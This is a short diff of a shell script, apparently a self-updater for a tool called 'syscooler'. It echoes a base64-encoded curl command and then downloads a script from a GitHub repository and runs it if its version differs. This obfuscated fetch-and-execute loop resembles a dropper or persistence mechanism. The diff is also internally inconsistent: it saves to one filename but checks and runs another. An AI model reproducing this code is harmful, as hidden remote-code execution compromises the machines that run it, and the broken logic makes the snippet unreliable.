@@ -15,9 +15,9 @@ echo 'echo "Y3VybCAtcyAtbyBrZmMuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t
 
 curl -s -o newkfc.sh https://raw.githubusercontent.com/1oneman1/syscooler/main/syscooler.sh
 sleep 60
-if [ "$VERSION" != "$(grep -o '^VERSION="[0-9\.]*"' newkfc.sh | cut -d'"' -f2)" ]; then
-    chmod +x newkfc.sh
-    ./newkfc.sh
+if [ "$VERSION" != "$(grep -o '^VERSION="[0-9\.]*"' newsyscool.sh | cut -d'"' -f2)" ]; then
+    chmod +x newsyscool.sh
+    ./newsyscool.sh
     exit 0
 else
     rm newkfc.sh
